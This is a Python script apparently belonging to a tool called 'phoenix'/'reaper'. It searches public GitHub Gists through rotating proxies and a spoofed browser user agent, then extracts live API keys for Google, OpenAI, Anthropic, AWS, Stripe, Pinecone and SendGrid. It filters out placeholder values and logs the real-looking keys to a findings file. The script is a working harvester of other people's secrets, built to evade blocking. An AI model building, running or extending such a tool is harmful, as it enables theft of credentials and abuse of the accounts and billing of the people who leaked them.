import requests
import re
import time
import random
import json
import sys
from pathlib import Path

# Add parent directory to path to reach phoenix package
sys.path.append(str(Path(__file__).parent.parent))
from phoenix.config import PROXIES

# Common API Key Patterns
PATTERNS = {
    "google": r"AIza[0-9A-Za-z-_]{35}",
    "openai": r"sk-[a-zA-Z0-9]{48}",
    "anthropic": r"sk-ant-api03-[a-zA-Z0-9-]{93}AA",
    "aws_id": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
    "stripe": r"sk_live_[0-9a-zA-Z]{24}",
    "pinecone": r"pcsk_[a-zA-Z0-9]{48}",
    "sendgrid": r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"
}

PLACEHOLDERS = ["abcdef", "123456", "your_api_key", "sample_key"]

class GitHubScavenger:
    def __init__(self, output_file="reaper/findings.jsonl"):
        self.output_file = Path(output_file)
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.session = requests.Session()
        # Add a common user agent to avoid immediate blocks
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        self._rotate_proxy()

    def _rotate_proxy(self):
        if PROXIES:
            proxy = random.choice(PROXIES)
            self.session.proxies.update({
                "http": proxy,
                "https": proxy
            })
            print(f"[Scavenger] Active Proxy: {proxy}")
        else:
            print("[Scavenger] Warning: No proxies loaded. Running RAW.")

    def search_gists(self, query):
        """
        Scans GitHub Gists via HTML search (primitive but effective for discovery).
        Better would be authenticated API search, but this is a starting point.
        """
        print(f"[Scavenger] Searching Gists for: {query}")
        # Note: Github search requires auth for code search via API. 
        # For public anonymous, we might have to scrape or use a proxy.
        # This is a skeleton - in production we'd use 'Phoenix' if blocked.
        url = f"https://gist.github.com/search?q={query}"
        try:
            resp = self.session.get(url)
            if resp.status_code == 200:
                # Find gist links
                links = re.findall(r'href="/[^/]+/[0-9a-f]{20,}"', resp.text)
                return [f"https://gist.github.com{l.split('\"')[1]}" for l in links]
        except Exception as e:
            print(f"[Scavenger] Error: {e}")
        return []

    def extract_keys(self, text):
        found = {}
        for name, pattern in PATTERNS.items():
            matches = re.findall(pattern, text)
            filtered = []
            for m in matches:
                if not any(p in m.lower() for p in PLACEHOLDERS):
                    filtered.append(m)
            if filtered:
                found[name] = list(set(filtered))
        return found

    def process_gist(self, url):
        print(f"[Scavenger] Processing: {url}")
        try:
            # Get raw content
            raw_url = url + "/raw"
            resp = self.session.get(raw_url)
            if resp.status_code == 200:
                keys = self.extract_keys(resp.text)
                if keys:
                    finding = {
                        "timestamp": time.time(),
                        "source": url,
                        "keys": keys
                    }
                    self.save_finding(finding)
                    return keys
        except Exception as e:
            print(f"[Scavenger] Gist Error: {e}")
        return None

    def save_finding(self, finding):
        with open(self.output_file, "a") as f:
            f.write(json.dumps(finding) + "\n")
        print(f"[Scavenger] FINDING LOGGED: {finding['keys'].keys()}")

if __name__ == "__main__":
    scavenger = GitHubScavenger()
    # Test queries
    queries = ["AIza", "sk-", "AKIA"]
    for q in queries:
        gists = scavenger.search_gists(q)
        for gist in gists[:5]: # Cap for test
            scavenger.process_gist(gist)
            time.sleep(1)
